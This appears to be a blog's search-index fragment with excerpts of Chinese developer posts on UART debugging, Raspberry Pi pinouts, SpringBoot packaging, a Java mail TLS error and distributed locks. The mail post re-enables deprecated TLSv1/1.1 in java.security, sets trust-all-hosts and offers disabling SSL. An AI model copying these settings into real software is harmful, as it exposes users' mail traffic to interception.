Receiver/Transmitter），通常称作UART，是一种异步收发传输器，是电脑硬件的一部分。它将要传输的资料在串行通信与并行通信之间加以转换。作为把并行输入信号转成串行输出信号的芯片，UART通常被集成于其他通讯接口的连接上。 UART 允许两个硬件外围设备之间的异步串行通信。它们可以位于同一块电路板上（例如微控制器与电机或LED屏幕通信），也可以位于两个不同的设备之间（例如设备微控制器与PC通信）。它可以允许通过串行读取/写入设备。 在许多物联网设备中，板上的UART端口保持打开状态，任何人都可以通过串口连接和访问以获得shell，日志输出等。设备在通常情况下会带有一组引脚，当我们连接到微控制器UART RX和TX引脚时，便可用于发送和接收串行数据。 ","date":"2024-03-04","objectID":"/posts/uart%E4%B8%B2%E5%8F%A3%E8%B0%83%E8%AF%95/:0:1","tags":[],"title":"UART串口调试","uri":"/posts/uart%E4%B8%B2%E5%8F%A3%E8%B0%83%E8%AF%95/"},{"categories":["开发板"],"content":"UART引脚作用介绍： VCC：供电pin，一般是3.3v-5v，正极 GND：接地，负极 RXD：接收数据引脚 TXD：发送数据引脚 连接方法：开发板单独供电，连接开发板GND、RXD、TXD接口；常用模块USB转TTL模块，模块供电按要求调整 模块GND –\u003e 开发板GND 模块RXD –\u003e 开发板TXD 模块TXD –\u003e 开发板RXD ","date":"2024-03-04","objectID":"/posts/uart%E4%B8%B2%E5%8F%A3%E8%B0%83%E8%AF%95/:0:2","tags":[],"title":"UART串口调试","uri":"/posts/uart%E4%B8%B2%E5%8F%A3%E8%B0%83%E8%AF%95/"},{"categories":["开发板"],"content":"串口调试注意事项： 1、先连接好UART接口在给开发板通电，否则MobaXterm接收不到串口信息 2、MobaXterm连接信息配置： 3、如果发现控制台窗口不能输入命令，则切换一下Flow control ，多尝试几次 ","date":"2024-03-04","objectID":"/posts/uart%E4%B8%B2%E5%8F%A3%E8%B0%83%E8%AF%95/:0:3","tags":[],"title":"UART串口调试","uri":"/posts/uart%E4%B8%B2%E5%8F%A3%E8%B0%83%E8%AF%95/"},{"categories":["开发板"],"content":"1.树莓派 https://pinout.xyz/ 树莓派4可用于外部嵌入式系统进行通信。它共有40个引脚，其中28个为GPIO引脚，其余为电源引脚。GPIO引脚不仅仅执行管单的I/0功能。它们可以提供 UART、SPI和IC通信。这些通信特定于每个引脚，其所有功能如下所述. 电源引脚 电源输入 在树莓派中，有两种供电方式，一种是来自USB-C电源端口，另一种是来自任意5V引脚。5伏引脚直接连接到USB-C适配器端口。5V引脚上的输入应稳定并符合其规格。如果电压较高，设备可能会被烧毁。5V输入引脚在电源输入时会绕过任何保险丝和稳压器，因此5V电源应符合其规格，以免造成任何伤害。 树莓派的电源输入引脚如下: 引脚2、4-\u003e+5V 电源输出 树莓派4中有3V3和5V两种电源输出引脚。5V直接连接到USB端口，但3V3通过稳压器连接，提供稳定的3伏输出，所有电源输出引脚如下: 3V3-引脚1、引脚17 5V-引脚2、引脚4 接地:树莓派4有多个内部连接的接地引脚，任何接地引脚都可以与电源或外部设备共同接地，接地引脚列表如下: 引脚6 引脚9 引脚14 引脚20 引脚25 引脚30 引脚34 引脚39 数字输入/输出引脚 几乎每个设备都需要输入和输出引脚来进行通信。该器件有28个GPIO引脚可用，这些引脚可用于任何数字输入和输出操作。控制器中的GPIO引脚有一些默认值。GPIO引脚从0-9将处于高电平状态，从10到以上引脚将处于低电平状态。树莓派4中的所有引脚如下: GPI00-引脚27 GPI01-引脚28 GPIO2-引脚3 GPIO3-引脚5 GPIO4-引脚7 GPIO5-引脚29 GPI06-引脚31 GPIO7-引脚26 GPIO8-引脚24 GPIO9-引脚21 GPIO10-引脚19 GPIO11-引脚23 GPIO12-引脚32 GPIO13-引脚33 GPI014-引脚8 GPIO15-引脚10 GPI016-引脚36 GPIO17-引脚11 GPI018-引脚12 GPIO19-引脚35 GPIO20-引脚38 GPIO21-引脚40 GPIO22-引脚15 GPIO23-引脚16 GPIO24-引脚18 GPI025-引脚22 GPIO26-引脚37 GPIO27-引脚13 树莓派4中的所有GPIO引脚不仅用于输入输出功能。每个GPIO引脚都可以用作其它功能，这将通过编程来指定。 串行通信模块 UART引脚 ​ 串行通信有很多种，UART就是其中之一。它因其简单的通信系统和对大多数软件的依赖而颇受欢迎。树莓派4中有多个UART通信引脚，如下所示: TXD1-GPI014-引脚8 RXD1-GPIO15-引脚10 TXD2-GPI00-引脚27 RXD2-GPI01-引脚28 TXD3-GPIO5-引脚29 RXD3-GPI04-引脚7 TXD4-GPI08-引脚24 RXD4-GPI09-引脚21 TXD5-GPIO12-引脚32 RXD5-GPI013-引脚33 SPI通信引脚 ​ 有些设备使用SP|协议，它可以帮助控制设备使用单根数据传输线控制多个设备。在树莓派4中有多个SP|引脚可用于SPI通信。树莓派4的SPI引脚如下: SPI3 CEO N-GPIO0-引脚27 SPI3 MISO-GPI01-引脚28 SPI3 MOSI-GPIO2-引脚3 SPI3 SCLK-GPIO3-引脚5 SPI4 CEO N-GPIO4-引脚7 SPI4 MISO-GPI05-引脚29 SPI4 MOSI-GPI06-引脚31 SPI4 SCLK-GPIO7-引脚26 SPI0 CE1 N-GPIO8-引脚24 SPI0 CEO N-GPIO9-引脚21 SPI0 MISO-GPIO10-引脚19 SPI0 MOSI-GPIO11-引脚23 SPI5 CEO N/SPI0 SCLK-GPIO12-引脚32 SPI5 MISO-GPIO13-引脚33 SPI5 MOSI-GPIO14-引脚8 SPI5 SCLK-GPIO15-引脚10 CTS0-GPI016-引脚36 RTS0-GPIO17-引脚11 SPI6 CEO N-GPIO18-引脚12 SPI6 MISO-GPI019-引脚35 SPI6 MOSI-GPIO20-引脚38 SPI6 SCLK-GPIO21-引脚40 I2C通信引脚 树莓派4还支持I2C协议，它是一些传感器和电机用于通信的串行通信类型。在Pi中，GPIO引脚还提供I2C支持。所有这些引脚如下: SDA0/SDA6-GPI00-引脚27 SCLO/SCL6-GPI01-引脚28 SDA1/SDA3-GPI02-引脚3 SCL1/SCL3-GPI03-引脚5 SDA3-GPI04-引脚7 SCL3-GP","date":"2024-02-22","objectID":"/posts/%E5%BC%80%E5%8F%91%E6%9D%BF%E5%BC%95%E8%84%9A%E5%9B%BE/:0:1","tags":[],"title":"开发板引脚图","uri":"/posts/%E5%BC%80%E5%8F%91%E6%9D%BF%E5%BC%95%E8%84%9A%E5%9B%BE/"},{"categories":["开发板"],"content":"2.香蕉派 Banana Pi BPI-M4 Zero - Banana Pi Wiki (banana-pi.org) ","date":"2024-02-22","objectID":"/posts/%E5%BC%80%E5%8F%91%E6%9D%BF%E5%BC%95%E8%84%9A%E5%9B%BE/:0:2","tags":[],"title":"开发板引脚图","uri":"/posts/%E5%BC%80%E5%8F%91%E6%9D%BF%E5%BC%95%E8%84%9A%E5%9B%BE/"},{"categories":["开发板"],"content":"1.安装系统 注：有的树莓派自带系统（如笔者的4B，说明书一般会注明） 先通过读卡器读写配套的sd卡。如果装好系统会有一个有东西的boot和空的G盘（不一定是G盘），系统位于boot盘（几百MB）。 自带系统：直接进入下一步。 不带系统：暂略，安装可见网上教程 ","date":"2024-02-21","objectID":"/posts/%E5%BC%80%E5%8F%91%E6%9D%BF%E7%94%A8%E9%87%87%E9%9B%86%E5%8D%A1%E8%BF%9E%E6%8E%A5%E7%AC%94%E8%AE%B0%E6%9C%AC%E5%B1%8F%E5%B9%95/:0:1","tags":[],"title":"开发板用采集卡连接笔记本屏幕","uri":"/posts/%E5%BC%80%E5%8F%91%E6%9D%BF%E7%94%A8%E9%87%87%E9%9B%86%E5%8D%A1%E8%BF%9E%E6%8E%A5%E7%AC%94%E8%AE%B0%E6%9C%AC%E5%B1%8F%E5%B9%95/"},{"categories":["开发板"],"content":"2.根据自己手头有的设备，选择方法 树莓派通常配有HDMI线（公头），只有有HDMI口（母头）的屏幕能直接连。( ･᷄д･᷅ )一般的显示器都是HDMI线（公头），笔记本有HDMI口（母头）但是没法输入信号当显示器。 有屏幕：直接连上即可。 没有屏幕： 有笔记本+采集卡：参见下一部分。 只有电脑+网络，没有采集卡：暂略，搜索“树莓派连笔记本” ","date":"2024-02-21","objectID":"/posts/%E5%BC%80%E5%8F%91%E6%9D%BF%E7%94%A8%E9%87%87%E9%9B%86%E5%8D%A1%E8%BF%9E%E6%8E%A5%E7%AC%94%E8%AE%B0%E6%9C%AC%E5%B1%8F%E5%B9%95/:0:2","tags":[],"title":"开发板用采集卡连接笔记本屏幕","uri":"/posts/%E5%BC%80%E5%8F%91%E6%9D%BF%E7%94%A8%E9%87%87%E9%9B%86%E5%8D%A1%E8%BF%9E%E6%8E%A5%E7%AC%94%E8%AE%B0%E6%9C%AC%E5%B1%8F%E5%B9%95/"},{"categories":["开发板"],"content":"采集卡+笔记本屏幕 下载PotPlayer，官网：http: //potplayer. tv/? lang=zh_CN 插入采集卡，打开potplayer，打开树莓派（没有画面试试重启） 1.左上角PotPlayer-打开-摄像头/其他设备 正常就会显示桌面，异常是显示彩条 如果画面异常，菜单-打开-设备设置，确认一下是USB Video之类的。没问题的话，重启树莓派。开机不快，会黑屏/彩条一会，中间会出现一次树莓标，正常就是上图↑的桌面。 备注：potplayer只能看到开发板桌面信息，不能通过系统操作桌面，可以在开发板插入鼠标和键盘来控制开发板。 开发板网站集锦： Banana Pi ： https://wiki.banana-pi.org/ Banana Pi BPI-M4 Zero： Banana Pi BPI-M4 Zero - Banana Pi Wiki (banana-pi.org) raspberrypi：https://www.raspberrypi.org/ ","date":"2024-02-21","objectID":"/posts/%E5%BC%80%E5%8F%91%E6%9D%BF%E7%94%A8%E9%87%87%E9%9B%86%E5%8D%A1%E8%BF%9E%E6%8E%A5%E7%AC%94%E8%AE%B0%E6%9C%AC%E5%B1%8F%E5%B9%95/:0:3","tags":[],"title":"开发板用采集卡连接笔记本屏幕","uri":"/posts/%E5%BC%80%E5%8F%91%E6%9D%BF%E7%94%A8%E9%87%87%E9%9B%86%E5%8D%A1%E8%BF%9E%E6%8E%A5%E7%AC%94%E8%AE%B0%E6%9C%AC%E5%B1%8F%E5%B9%95/"},{"categories":["Java后端"],"content":" \u003cbuild\u003e \u003cfinalName\u003eruoyi-admin\u003c/finalName\u003e \u003cplugins\u003e \u003c!-- 1、编译出不带 lib 文件夹的Jar包 --\u003e \u003cplugin\u003e \u003cgroupId\u003eorg.springframework.boot\u003c/groupId\u003e \u003cartifactId\u003espring-boot-maven-plugin\u003c/artifactId\u003e \u003cversion\u003e2.2.2.RELEASE\u003c/version\u003e \u003cconfiguration\u003e \u003c!--表示编译版本配置有效--\u003e \u003cfork\u003etrue\u003c/fork\u003e \u003c!--引入第三方jar包时,不添加则引入的第三方jar不会被打入jar包中--\u003e \u003cincludeSystemScope\u003etrue\u003c/includeSystemScope\u003e \u003c!--排除第三方jar文件--\u003e \u003cincludes\u003e \u003cinclude\u003e \u003cgroupId\u003enothing\u003c/groupId\u003e \u003cartifactId\u003enothing\u003c/artifactId\u003e \u003c/include\u003e \u003c/includes\u003e \u003c/configuration\u003e \u003cexecutions\u003e \u003cexecution\u003e \u003cgoals\u003e \u003cgoal\u003erepackage\u003c/goal\u003e \u003c/goals\u003e \u003c/execution\u003e \u003c/executions\u003e \u003c/plugin\u003e \u003c!-- 2、完成对Java代码的编译，可以指定项目源码的jdk版本，编译后的jdk版本，以及编码 --\u003e \u003cplugin\u003e \u003cgroupId\u003eorg.apache.maven.plugins\u003c/groupId\u003e \u003cartifactId\u003emaven-compiler-plugin\u003c/artifactId\u003e \u003cconfiguration\u003e \u003c!-- 源代码使用的JDK版本 --\u003e \u003csource\u003e${java.version}\u003c/source\u003e \u003c!-- 需要生成的目标class文件的编译版本 --\u003e \u003ctarget\u003e${java.version}\u003c/target\u003e \u003c!-- 字符集编码 --\u003e \u003cencoding\u003eUTF-8\u003c/encoding\u003e \u003c!-- 用来传递编译器自身不包含但是却支持的参数选项 --\u003e \u003ccompilerArguments\u003e \u003cverbose/\u003e \u003c!-- windwos环境（二选一） --\u003e \u003c!--\u003cbootclasspath\u003e${java.home}/lib/rt.jar;${java.home}/lib/jce.jar\u003c/bootclasspath\u003e--\u003e \u003cbootclasspath\u003eC:/Program Files/Java/jdk1.8.0_301/jre/lib/rt.jar;C:/Program Files/Java/jdk1.8.0_301/jre/lib/jce.jar\u003c/bootclasspath\u003e \u003c!-- Linux环境（二选一） --\u003e \u003c!--\u003cbootclasspath\u003e${java.home}/lib/rt.jar:${java.home}/lib/jce.jar\u003c/bootclasspath\u003e--\u003e \u003c/compilerArguments\u003e \u003c/configuration\u003e \u003c/plugin\u003e \u003c!-- 3、将所有依赖的jar文件复制到target/lib目录 --\u003e \u003cplugin\u003e \u003cgroupId\u003eorg.apache.maven.plugins\u003c/groupId\u003e \u003cartifactId\u003emaven-dependency-plugin\u003c/artifactId\u003e \u003cversion\u003e2.8\u003c/version\u003e \u003cexecutions\u003e \u003cexecution\u003e \u003cid\u003ecopy-dependencies\u003c/id\u003e \u003cphase\u003eprepare-package\u003c/phase\u003e \u003cgoals\u003e \u003cgoal\u003ecopy-dependencies\u003c/goal\u003e \u003c/goals\u003e \u003cconfiguration\u003e \u003c!--复制到哪个路径，${project.build.directory} 缺醒为 target，其他内置参数见下面解释--\u003e \u003coutputDirectory\u003e${project.build.directory}/lib\u003c/outputDirectory\u003e \u003coverWriteReleases\u003efalse\u003c/overWriteReleases\u003e \u003coverWriteSnapshots\u003efalse\u003c/overWriteSnapshots\u003e \u003coverWriteIfNewer\u003etrue\u003c/overWriteIfNewer\u003e \u003c/configuration\u003e \u003c/execution\u003e \u003c/e","date":"2024-01-25","objectID":"/posts/springboot%E9%A1%B9%E7%9B%AE%E6%89%93%E5%8C%85%E7%98%A6%E8%BA%AB/:0:0","tags":["打包瘦身"],"title":"SpringBoot项目打包瘦身","uri":"/posts/springboot%E9%A1%B9%E7%9B%AE%E6%89%93%E5%8C%85%E7%98%A6%E8%BA%AB/"},{"categories":["Java后端"],"content":" java.net.MalformedURLException at java.net.URL.\u003cinit\u003e(URL.java:645) at java.net.URL.\u003cinit\u003e(URL.java:508) at java.net.URL.\u003cinit\u003e(URL.java:457) at com.ruoyi.common.email.util.EmailSendUtil.send(EmailSendUtil.java:74) at jdk.nashorn.internal.scripts.Script$4$\\^eval\\_.:program(\u003ceval\u003e:56) at jdk.nashorn.internal.runtime.ScriptFunctionData.invoke(ScriptFunctionData.java:637) at jdk.nashorn.internal.runtime.ScriptFunction.invoke(ScriptFunction.java:494) at jdk.nashorn.internal.runtime.ScriptRuntime.apply(ScriptRuntime.java:393) at jdk.nashorn.api.scripting.NashornScriptEngine.evalImpl(NashornScriptEngine.java:449) at jdk.nashorn.api.scripting.NashornScriptEngine.evalImpl(NashornScriptEngine.java:406) at jdk.nashorn.api.scripting.NashornScriptEngine.evalImpl(NashornScriptEngine.java:402) at jdk.nashorn.api.scripting.NashornScriptEngine.eval(NashornScriptEngine.java:155) at javax.script.AbstractScriptEngine.eval(AbstractScriptEngine.java:264) at com.ruoyi.quartz.util.NashornScriptInvokeUtil.invokeAllScript(NashornScriptInvokeUtil.java:17) at com.ruoyi.quartz.util.ScriptInvokeUtil.invokeMethod(ScriptInvokeUtil.java:28) at com.ruoyi.quartz.util.JobInvokeUtil.invokeMethod(JobInvokeUtil.java:44) at com.ruoyi.quartz.util.QuartzDisallowConcurrentExecution.doExecute(QuartzDisallowConcurrentExecution.java:23) at com.ruoyi.quartz.util.AbstractQuartzJob.execute(AbstractQuartzJob.java:52) at org.quartz.core.JobRunShell.run(JobRunShell.java:202) at org.quartz.simpl.SimpleThreadPool$WorkerThread.run(SimpleThreadPool.java:573) Caused by: java.lang.NullPointerException 06:24:50.653 [quartzScheduler_Worker-5] ERROR c.r.q.u.AbstractQuartzJob - [execute,58] - 任务执行异常 - ： cn.hutool.extra.mail.MailException: MessagingException: Could not connect to SMTP host: smtp.163.com, port: 465 at cn.hutool.extra.mail.Mail.send(Mail.java:398) at cn.hutool.extra.mail.MailUtil.send(MailUtil.java:416) at cn.hutool.extra.mail.MailUtil.send(MailUtil.java:349) at cn.hutool.extra.mail.MailUtil.send(MailUtil.java:","date":"2024-01-23","objectID":"/posts/javax.net.ssl.sslhandshakeexception-no-appropriate-protocol-protocol-is-disastring----%E5%8F%91%E9%80%81%E9%82%AE%E4%BB%B6%E6%8A%A5%E9%94%99/:0:0","tags":["java发送邮件"],"title":"javax.net.ssl.SSLHandshakeException: No appropriate protocol (protocol is disa(String)----发送邮件报错","uri":"/posts/javax.net.ssl.sslhandshakeexception-no-appropriate-protocol-protocol-is-disastring----%E5%8F%91%E9%80%81%E9%82%AE%E4%BB%B6%E6%8A%A5%E9%94%99/"},{"categories":["Java后端"],"content":"问题原因 package com.ruoyi.common.email.util; import cn.hutool.extra.mail.Mail; import cn.hutool.extra.mail.MailAccount; import cn.hutool.extra.mail.MailUtil; import com.ruoyi.common.constant.CacheConstants; import com.ruoyi.common.core.redis.RedisCache; import com.ruoyi.common.email.EmailConfig; import com.ruoyi.common.email.EmailVO; import com.ruoyi.common.exception.GlobalException; import com.ruoyi.common.exception.tool.EmailConfigException; import com.ruoyi.common.exception.tool.EmailSendException; import com.ruoyi.common.utils.EncryptUtils; import com.ruoyi.common.utils.StringUtils; import com.ruoyi.common.utils.spring.SpringUtils; import com.sun.mail.util.MailSSLSocketFactory; import org.slf4j.Logger; import org.slf4j.LoggerFactory; import javax.activation.DataSource; import java.io.File; import java.io.InputStream; import java.net.URL; import java.net.URLConnection; import java.security.GeneralSecurityException; import java.util.*; public class EmailSendUtil { private static final Logger log = LoggerFactory.getLogger(EmailSendUtil.class); private static final String EMAIL_CONFIG_HOST = \"email.config.host\"; private static final String EMAIL_CONFIG_PORT = \"email.config.port\"; private static final String EMAIL_CONFIG_USER = \"email.config.user\"; private static final String EMAIL_CONFIG_PASS = \"email.config.pass\"; private static final String EMAIL_CONFIG_FROM_USER = \"email.config.fromUser\"; /** * 获取邮件配置信息 * @return */ public static EmailConfig getEmailConfig(){ EmailConfig emailConfig = new EmailConfig(); emailConfig.setHost(getCacheValue(EMAIL_CONFIG_HOST)); emailConfig.setPort(getCacheValue(EMAIL_CONFIG_PORT)); emailConfig.setUser(getCacheValue(EMAIL_CONFIG_USER)); emailConfig.setPass(getCacheValue(EMAIL_CONFIG_PASS)); emailConfig.setFromUser(getCacheValue(EMAIL_CONFIG_FROM_USER)); return emailConfig; } /** * 获取邮件账户信息 * @return */ public static MailAccount getMailAccount() { EmailConfig emailConfig = getEmailConfig(); // 封装 MailAccount account = new MailAccount(); /","date":"2024-01-23","objectID":"/posts/javax.net.ssl.sslhandshakeexception-no-appropriate-protocol-protocol-is-disastring----%E5%8F%91%E9%80%81%E9%82%AE%E4%BB%B6%E6%8A%A5%E9%94%99/:0:1","tags":["java发送邮件"],"title":"javax.net.ssl.SSLHandshakeException: No appropriate protocol (protocol is disa(String)----发送邮件报错","uri":"/posts/javax.net.ssl.sslhandshakeexception-no-appropriate-protocol-protocol-is-disastring----%E5%8F%91%E9%80%81%E9%82%AE%E4%BB%B6%E6%8A%A5%E9%94%99/"},{"categories":["Java后端"],"content":"解决问题- 从JDK入手 我找到Java安装目录下D:\\Java\\jdk1.8.0_291\\jre\\lib\\security中的java.security文件，将对应的SSLv3删掉了，但运行还是出错。最后发现SSLv3后面有两个和它后缀一样的算法，将它们一起删掉后重启项目，成功解决问题。 # Example: # jdk.tls.disabledAlgorithms=MD5, SSLv3, DSA, RSA keySize \u003c 2048 jdk.tls.disabledAlgorithms=SSLv3, TLSv1, TLSv1.1,RC4, DES, MD5withRSA, \\ DH keySize \u003c 1024, EC keySize \u003c 224, 3DES_EDE_CBC, anon, NULL, \\ include jdk.disabled.namedCurves # Legacy algorithms for Secure Socket Layer/Transport Layer Security (SSL/TLS) # processing in JSSE implementation. 删除后的文件如下图所示。 # Example: # jdk.tls.disabledAlgorithms=MD5, SSLv3, DSA, RSA keySize \u003c 2048 jdk.tls.disabledAlgorithms=RC4, DES, MD5withRSA, \\ DH keySize \u003c 1024, EC keySize \u003c 224, 3DES_EDE_CBC, anon, NULL, \\ include jdk.disabled.namedCurves # Legacy algorithms for Secure Socket Layer/Transport Layer Security (SSL/TLS) # processing in JSSE implementation. 衍生命令 docker中Java安装目录为: /usr/local/openjdk-8 复制容器中的java.security文件到宿主机 docker cp e61b6e572d86:/usr/local/openjdk-8/lib/security/java.security ./java.security 使用宿主机的vi命令修改文件 vi java.security 复制宿主机到容器中的java.security文件 docker cp ./java.security e61b6e572d86:/usr/local/openjdk-8/lib/security/java.security 重启容器 docker restart e61b6e572d86 从容器入手 修改容器的java.security文件, 目前还未验证 RUN sed -i 's/jdk.tls.disabledAlgorithms=SSLv3, TLSv1, TLSv1.1/jdk.tls.disabledAlgorithms=SSLv3/g' /opt/java/openjdk/lib/security/java.security # 核心也是修改java.security文件中的jdk.tls.disabledAlgorithms配置，删除掉TLSv1\u0026TLSv1.1 ","date":"2024-01-23","objectID":"/posts/javax.net.ssl.sslhandshakeexception-no-appropriate-protocol-protocol-is-disastring----%E5%8F%91%E9%80%81%E9%82%AE%E4%BB%B6%E6%8A%A5%E9%94%99/:0:2","tags":["java发送邮件"],"title":"javax.net.ssl.SSLHandshakeException: No appropriate protocol (protocol is disa(String)----发送邮件报错","uri":"/posts/javax.net.ssl.sslhandshakeexception-no-appropriate-protocol-protocol-is-disastring----%E5%8F%91%E9%80%81%E9%82%AE%E4%BB%B6%E6%8A%A5%E9%94%99/"},{"categories":["Java后端"],"content":"解决问题-从代码入手 之前是错误实例，修改jdk是不明智的操作 方案一 /方案一： // SSL 握手失败可能与协议版本协商不稳定有关，需在代码中强制指定 TLSv1.2： account.setSslProtocols(\"TLSv1.2\"); // 方案二： // 补充 SSL SocketFactory 相关参数，避免因缺少证书信任导致握手失败：添加 SSL 安全套接字工厂配置 // MailSSLSocketFactory sf = null; // try { // sf = new MailSSLSocketFactory(); // sf.setTrustAllHosts(true); // 信任所有主机（测试环境可临时启用）:ml-citation{ref=\"4\" data=\"citationList\"} // account.setCustomProperty(\"mail.smtp.ssl.socketFactory\", sf); // account.setCustomProperty(\"mail.smtp.ssl.enable\", \"true\"); // } catch (GeneralSecurityException e) { // throw new RuntimeException(e); // } 方案二 1.换个不用ssl端口的邮件服务器，相应调整代码： MailAccount account = new MailAccount(); account.setSslEnable(false); account.setStarttlsEnable(false); 如果比较着急，并且对邮件安全要求不高，可以这样，也能解决。 方案三 手动指定为TLSv1.2协议 百度发现，可能是本地jar包与服务器jar包版本不一致，才一个成功一个失败；默认用TLSv1.1协议，但是新jar包认为这个协议不安全，就会报错无法链接邮件服务器。 代码如下： MailAccount account = new MailAccount(); // ssl启用 account.setSslEnable(true); // STARTTLS启用 account.setStarttlsEnable(true); try { // 解决连接smtp服务失败问题，升级了hutool版本才有这个方法 MailSSLSocketFactory sf = new MailSSLSocketFactory(\"TLSv1.2\"); //信任所有host sf.setTrustAllHosts(true); //自定义设置 account.setCustomProperty(\"mail.smtp.ssl.socketFactory\", sf); account.setCustomProperty(\"mail.smtp.ssl.protocols\", \"TLSv1.2\"); } catch (GeneralSecurityException e) { throw new RuntimeException(e); } 注意，如果是老版本hutool的jar包，有可能没有setCustomProperty方法，需要换成新版本hutool的jar包才有（已测试5.3.4版本没有，5.7.19有）： \u003cdependency\u003e \u003cgroupId\u003ecn.hutool\u003c/groupId\u003e \u003cartifactId\u003ehutool-all\u003c/artifactId\u003e \u003cversion\u003e5.7.19\u003c/version\u003e \u003c/dependency\u003e ","date":"2024-01-23","objectID":"/posts/javax.net.ssl.sslhandshakeexception-no-appropriate-protocol-protocol-is-disastring----%E5%8F%91%E9%80%81%E9%82%AE%E4%BB%B6%E6%8A%A5%E9%94%99/:0:3","tags":["java发送邮件"],"title":"javax.net.ssl.SSLHandshakeException: No appropriate protocol (protocol is disa(String)----发送邮件报错","uri":"/posts/javax.net.ssl.sslhandshakeexception-no-appropriate-protocol-protocol-is-disastring----%E5%8F%91%E9%80%81%E9%82%AE%E4%BB%B6%E6%8A%A5%E9%94%99/"},{"categories":["后端"],"content":"业务背景 ​ 在某业务单据中，需要对单据进行审核操作，发现分录有1000条数据，审核时间30s,需要进行优化 ​ 审核插件主要进行了两个操作： ​ 1、数据校验（组map,对数据进行校验） ​ 2、更新中间表（同步资源余量表） ","date":"2024-01-19","objectID":"/posts/%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81%E9%A2%97%E7%B2%92%E5%BA%A6%E5%B0%8F%E8%AE%B0--%E5%8A%A0%E9%94%81%E6%97%B6%E9%97%B4%E8%BF%87%E9%95%BF/:0:1","tags":["分布式锁"],"title":"分布式锁颗粒度小记--加锁时间过长","uri":"/posts/%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81%E9%A2%97%E7%B2%92%E5%BA%A6%E5%B0%8F%E8%AE%B0--%E5%8A%A0%E9%94%81%E6%97%B6%E9%97%B4%E8%BF%87%E9%95%BF/"},{"categories":["后端"],"content":"代码 public class AbstractResourceDetailLockOp extends AbstractOperationServicePlugIn { protected List\u003cDLock\u003e resourceLockList = Lists.newArrayList(); protected static final long DEFAULT_LOCK_TIME = 30000L; @Override public void beforeExecuteOperationTransaction(BeforeOperationArgs e) { DynamicObject[] dataEntities = e.getDataEntities(); String operationKey = e.getOperationKey(); if (!opKeySet().contains(operationKey)){ return; } Set\u003cString\u003e lockKeySet = generateLockKeySet(dataEntities); if (CollectionUtils.isEmpty(lockKeySet)){ return; } for (String lockKey : lockKeySet){ DLock resourceLock = DLock.createReentrant(lockKey, lockKey).fastMode(); boolean tryLock = resourceLock.tryLock(getLockTime()); if (!tryLock) { throw new KDBizException(String.format(ResManager.loadKDString(\"获取库存锁失败，请稍后再试。lock_key:%s\", \"InventoryDLockOp_0\", \"ec-ecma-opplugin\", new Object[0]), lockKey)); } this.resourceLockList.add(resourceLock); } } /** * 生成互斥锁Key * * 根据实际情况生成，如项目ID_单位工程ID_资源ID */ protected Set\u003cString\u003e generateLockKeySet(DynamicObject[] dataEntities){ return Sets.newHashSet(); } /** * 操作代码列表 */ protected Set\u003cString\u003e opKeySet(){ return Sets.newHashSet(); } /** * 获取加锁时间 */ protected Long getLockTime(){ return DEFAULT_LOCK_TIME; } @Override public void onReturnOperation(ReturnOperationArgs e) { super.onReturnOperation(e); if (CollectionUtils.isEmpty(this.resourceLockList)){ return; } this.resourceLockList.forEach(DLock::unlock); this.resourceLockList.clear(); } } ","date":"2024-01-19","objectID":"/posts/%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81%E9%A2%97%E7%B2%92%E5%BA%A6%E5%B0%8F%E8%AE%B0--%E5%8A%A0%E9%94%81%E6%97%B6%E9%97%B4%E8%BF%87%E9%95%BF/:0:2","tags":["分布式锁"],"title":"分布式锁颗粒度小记--加锁时间过长","uri":"/posts/%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81%E9%A2%97%E7%B2%92%E5%BA%A6%E5%B0%8F%E8%AE%B0--%E5%8A%A0%E9%94%81%E6%97%B6%E9%97%B4%E8%BF%87%E9%95%BF/"},{"categories":["后端"],"content":"耗时查询 代码调用性能消耗报告： kd.bos.service.ServiceFactory.FormService.batchInvokeAction(), cost 30217 ms. |----FormService.batchInvokeAction('983ee13baa4049329a0b1f2a71ec3732'), cost 30216 ms. |----FormService.ecma_totalrequireplan.itemClick('ecma_totalrequireplan','ecma_totalrequireplan','tbmain'), cost 30211 ms. |----operate.BillView.invokeOperation('audit','ecma_totalrequireplan'), cost 30184 ms. |----operate.FormView.invokeOperation('audit'), cost 30183 ms. |----operate.FormOperate.execute('ecma_totalrequireplan','audit','Audit','kd.bos.entity.operate.Audit'), cost 30182 ms. |----operate.Audit.invokeOperation(), cost 30171 ms. |----ModelCache.getAll(), cost 55 ms. |----DataEntitySerializer.readCollection(), cost 23 ms. |----datareader.loadRefence(), cost 13 ms. |----opservice.OperationService.invokeOperation('ecma_totalrequireplan','audit'), cost 30092 ms. |----opservice.initialize(), cost 222 ms. |----msopfacade.kd.bos.service.botp.facade.OperateBfFacade.afterInitialize(), cost 208 ms. |----FunctionManage.get(), cost 206 ms. |----opservice.excute(dataEntities)(), cost 29867 ms. |----opservice.doExcete(), cost 27015 ms. |----opservice.validate(), cost 61 ms. |----opvalidate.ValidationService.validate(), cost 61 ms. |----opvalidate.kd.bos.service.operation.validate.MutexValidatorvalidate(), cost 36 ms. |----MutexValidator.batchRequireMutex(), cost 36 ms. |----opplugin.cbtgc.ec.ecma.op.ZJJTTotalRequirePlanInitResourceOp.beforeExecuteOperationTransaction(), cost 26599 ms. |----opservice.beforeCallOperationTransaction(), cost 59 ms. |----msopfacade.kd.bos.service.botp.facade.OperateBfFacade.afterUpdateBillStatus(), cost 59 ms. |----opservice.callOperationTransaction(), cost 294 ms. |----opservice.TX.required(), cost 292 ms. |----opplugin.kd.ec.material.opplugin.TotalRequirePlanOp.beginOperationTransaction(), cost 82 ms. |----BusinessDataServiceHelper.loadSingle(), cost 77 ms. |----datareader.loadSingle(), cost 50 ms. |----opplugin.cbtgc.ec.ecma.op.ZJJTTotalRequirePlanInitResou","date":"2024-01-19","objectID":"/posts/%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81%E9%A2%97%E7%B2%92%E5%BA%A6%E5%B0%8F%E8%AE%B0--%E5%8A%A0%E9%94%81%E6%97%B6%E9%97%B4%E8%BF%87%E9%95%BF/:0:3","tags":["分布式锁"],"title":"分布式锁颗粒度小记--加锁时间过长","uri":"/posts/%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81%E9%A2%97%E7%B2%92%E5%BA%A6%E5%B0%8F%E8%AE%B0--%E5%8A%A0%E9%94%81%E6%97%B6%E9%97%B4%E8%BF%87%E9%95%BF/"},{"categories":["后端"],"content":"解决方案 原因： ​ 